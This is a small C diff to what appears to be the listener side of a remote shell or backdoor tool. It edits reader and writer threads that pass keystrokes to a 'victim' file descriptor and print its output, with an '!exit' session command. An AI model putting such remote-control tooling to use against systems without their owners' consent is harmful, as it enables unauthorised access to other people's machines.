@@ -68,15 +68,15 @@ void *Socket_Reader(){
 
     n = read(a.dest, buffer, MAXBUF);
     write(STDOUT_FILENO, buffer, n);
-    printf("%d>", a.dest);
+    //printf("%d>", a.dest);
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
-        sync();
+
         if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
-        sync(); fflush(NULL);
-        printf("%d>", a.dest);
-        sync(); fflush(NULL);
+        fflush(NULL);
+        //printf("%d>", a.dest);
+        fflush(NULL);
     }
 
     if (n == -1)
@@ -98,15 +98,14 @@ void *Socket_Writer()
 
     while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
     {
-        fflush(NULL);
-        if (strcmp(buffer, "!exit\n") == 0) {
+        printf("|||||\n%s\n|||||\n", buffer);
+        if (strcmp(buffer, "!exit\n") == 0 || strcmp(buffer, "!exit\n\n") == 0) {
             printf("Exiting session...\n");
             a.kill = 1;
             return NULL;
         } else {
-            sync();
-            write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
-            sync();
+
+            write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
         }
     }
 
